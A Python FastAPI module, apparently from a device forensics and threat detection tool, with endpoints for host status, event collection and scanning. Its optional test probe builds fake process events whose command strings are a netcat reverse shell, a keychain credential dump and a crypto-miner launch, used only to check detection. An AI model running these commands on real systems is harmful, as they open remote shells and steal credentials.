"""
Live Device Forensic Telemetry & Threat Detection API.
Enables real-time host inspection, live process & socket telemetry collection,
and immediate threat detection on the user's actual device.
"""

from typing import Any, Dict, List, Optional
from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel, Field

from investigation_engine.collector import device_collector
from investigation_engine.models import (
    InvestigationReconstructionResult,
    SecurityEvent,
    EventType,
    EventSeverity,
)
from investigation_engine.reconstruction import reconstruct_attack_timeline

router = APIRouter(prefix="/api/v1/device", tags=["Live Device"])


class DeviceStatusResponse(BaseModel):
    hostname: str
    os: str
    current_user: str
    total_processes: int
    total_active_sockets: int
    status: str
    timestamp: str
    cpu_percent: float
    memory_percent: float


class DeviceScanRequest(BaseModel):
    max_events: int = Field(default=350, ge=50, le=500, description="Max live host events to collect and analyze")
    include_test_probe: bool = Field(default=False, description="Safely inject an authorized test threat probe to verify live detection")
    test_probe_type: Optional[str] = Field(default="reverse_shell", description="reverse_shell, credential_dump, or crypto_miner")


class DeviceScanResponse(InvestigationReconstructionResult):
    events: List[SecurityEvent] = Field(
        default_factory=list,
        description="Normalized host events analyzed by the scan (the timeline only carries summaries)",
    )


@router.get("/status", response_model=DeviceStatusResponse)
async def get_device_status() -> DeviceStatusResponse:
    """Returns live hardware, OS, and process summary for the local device."""
    try:
        status_data = device_collector.get_device_status()
        return DeviceStatusResponse(**status_data)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Failed to query device status: {exc}")


@router.post("/scan", response_model=DeviceScanResponse)
async def scan_device(request: Optional[DeviceScanRequest] = None) -> DeviceScanResponse:
    """
    Performs a live forensic telemetry collection and threat detection scan across
    running processes, active network connections, and startup persistence items on this device.
    """
    req = request or DeviceScanRequest()

    try:
        events = device_collector.collect_device_events(max_events=req.max_events)

        if req.include_test_probe:
            probe_cmds = {
                "reverse_shell": "nc -e /bin/sh 198.51.100.80 4444 (GHOSTTRACE_TEST_THREAT)",
                "credential_dump": "security dump-keychain -d /Library/Keychains/login.keychain (GHOSTTRACE_TEST_THREAT)",
                "crypto_miner": "xmrig --url stratum+tcp://pool.sim:3333 (GHOSTTRACE_TEST_THREAT)",
            }
            cmd_text = probe_cmds.get(req.test_probe_type or "reverse_shell", probe_cmds["reverse_shell"])

            import time
            from datetime import datetime, timezone
            probe_event = SecurityEvent(
                event_id=f"test-probe-{int(time.time())}",
                timestamp=datetime.now(timezone.utc),
                event_type=EventType.PROCESS_EXECUTION,
                host_id=device_collector.hostname,
                user_id=device_collector.current_user,
                process_id=99999,
                process_name="test_threat_probe",
                command_line=cmd_text,
                action="PROCESS_EXEC",
                severity=EventSeverity.CRITICAL,
                is_suspicious=True,
                source="live_device_security_probe",
                original_event_data={
                    "test_probe": True,
                    "command_line": cmd_text,
                    "reason": "Authorized real-time threat detection verification",
                },
            )
            events.append(probe_event)
            events.sort(key=lambda e: e.timestamp)

        # Run attack timeline reconstruction & detection rules
        recon_result = reconstruct_attack_timeline(events)
        return DeviceScanResponse(**dict(recon_result), events=events)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Failed to scan device telemetry: {exc}")


@router.get("/events", response_model=List[SecurityEvent])
async def get_device_events(max_events: int = Query(default=350, ge=50, le=500)) -> List[SecurityEvent]:
    """Retrieves raw normalized canonical security events from the local device."""
    try:
        return device_collector.collect_device_events(max_events=max_events)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Failed to collect device events: {exc}")

